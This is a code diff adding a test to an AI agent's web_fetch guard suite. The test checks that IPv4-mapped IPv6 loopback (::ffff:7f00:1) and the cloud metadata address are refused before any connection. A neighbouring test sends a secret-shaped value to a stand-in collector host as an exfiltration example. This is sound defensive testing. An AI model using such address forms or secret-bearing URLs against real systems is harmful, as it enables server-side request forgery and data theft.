@@ -40,6 +40,8 @@ import assert from "node:assert/strict";
 import { mkdtemp, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import path from "node:path";
+import http from "node:http";
+import type { AddressInfo } from "node:net";
 
 import { readOnlyTools, isBlockedFetchAddress } from "@kaidera/openkai-core";
 import type { AgentTool } from "@earendil-works/pi-agent-core";
@@ -109,6 +111,45 @@ test("W4: web_fetch refuses a URL carrying a secret-shaped value (outbound exfil
   const out = resultText((await web.execute("t", { url: `http://collector.invalid/p?leak=${secret}` })) as any);
   assert.match(out, /secret-shaped/i, "a secret in the URL must never be sent");
   assert.ok(!out.includes(secret), "the secret must not be echoed back in the refusal either");
+});
+
+// ── W5: web_fetch refuses an IPv4-mapped IPv6 loopback (REACH, not classifier)
+//
+// The pass-4 fix matched only the dotted-quad form `::ffff:127.0.0.1`, but
+// `new URL('http://[::ffff:127.0.0.1]/').hostname` serialises the v4 tail to
+// compressed hex — `[::ffff:7f00:1]` — so the guard's dotted-quad branch was
+// dead on the live path and the loopback target reached the socket. W1 (a
+// classifier table fed the dotted-quad string the tool never actually sees)
+// passed anyway, which is exactly why this must be a reach test through the
+// real caller, driven against a live listener. Fails before the mapped-hex
+// decode lands; passes after.
+
+test("W5: web_fetch refuses an IPv4-mapped IPv6 loopback (reach, through new URL())", async () => {
+  // Classifier floor: the hex form new URL() emits, and the metadata mapping,
+  // must both be denied — the dotted-quad-only table missed these.
+  assert.equal(isBlockedFetchAddress("::ffff:7f00:1"), true, "::ffff:7f00:1 (=127.0.0.1) must be blocked");
+  assert.equal(isBlockedFetchAddress("::ffff:a9fe:a9fe"), true, "::ffff:a9fe:a9fe (=169.254.169.254 metadata) must be blocked");
+
+  // Reach: a real loopback listener must never be touched. The guard has to
+  // refuse BEFORE any connect, so a hit count of zero is the true assertion —
+  // http://[::ffff:127.0.0.1] normalises to [::ffff:7f00:1] inside web_fetch.
+  let hits = 0;
+  const server = http.createServer((_req, res) => {
+    hits += 1;
+    res.end("SECRET-LOOPBACK-BODY");
+  });
+  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", () => resolve()));
+  const port = (server.address() as AddressInfo).port;
+  try {
+    const dir = await mkdtemp(path.join(tmpdir(), "openkai-inc07-web-"));
+    const web = toolByName(readOnlyTools(dir), "web_fetch");
+    const out = resultText((await web.execute("t", { url: `http://[::ffff:127.0.0.1]:${port}/x` })) as any);
+    assert.match(out, /non-public address/i, "IPv4-mapped IPv6 loopback must be refused at the guard");
+    assert.ok(!out.includes("SECRET-LOOPBACK-BODY"), "the loopback body must never enter the tool result");
+    assert.equal(hits, 0, "the guard must refuse before any connect — zero listener hits");
+  } finally {
+    await new Promise<void>((resolve) => server.close(() => resolve()));
+  }
 });
 
 // ── G1/G2: glob pattern-length cap ──────────────────────────────────────────
